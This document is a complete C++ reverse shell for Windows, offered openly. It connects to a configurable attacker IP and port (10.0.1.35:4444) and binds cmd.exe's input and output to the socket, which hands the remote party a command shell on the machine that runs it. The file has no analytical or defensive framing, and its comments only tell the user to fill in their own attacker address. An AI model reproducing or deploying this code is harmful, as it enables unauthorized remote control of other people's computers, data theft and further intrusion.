#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <string>

#pragma comment(lib, "ws2_32.lib")

int main() {
    // Specify your LHOST (attacker's IP) and LPORT (port to listen on)
    const char* LHOST = "10.0.1.35";  // Replace with your attacker's IP
    const int LPORT = 4444;           // Replace with your attacker's port

    // Initialize WinSock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed." << std::endl;
        return 1;
    }

    // Create socket
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Socket creation failed." << std::endl;
        WSACleanup();
        return 1;
    }

    // Setup sockaddr_in structure for the connection
    sockaddr_in sa;
    sa.sin_family = AF_INET;
    sa.sin_port = htons(LPORT);
    sa.sin_addr.s_addr = inet_addr(LHOST);

    // Connect to the attacker's machine
    if (connect(sock, (struct sockaddr*)&sa, sizeof(sa)) == SOCKET_ERROR) {
        std::cerr << "Connection failed." << std::endl;
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Redirect stdin, stdout, and stderr to the socket
    DWORD old;
    HANDLE hStdIn = GetStdHandle(STD_INPUT_HANDLE);
    HANDLE hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
    HANDLE hStdErr = GetStdHandle(STD_ERROR_HANDLE);
    
    // Use CreateProcess to hide window and run cmd.exe
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = (HANDLE)sock;
    si.hStdOutput = (HANDLE)sock;
    si.hStdError = (HANDLE)sock;

    ZeroMemory(&pi, sizeof(pi));

    // Create a new process (cmd.exe)
    if (!CreateProcess(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        std::cerr << "CreateProcess failed." << std::endl;
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Wait for the process to finish
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Clean up
    closesocket(sock);
    WSACleanup();
    return 0;
}
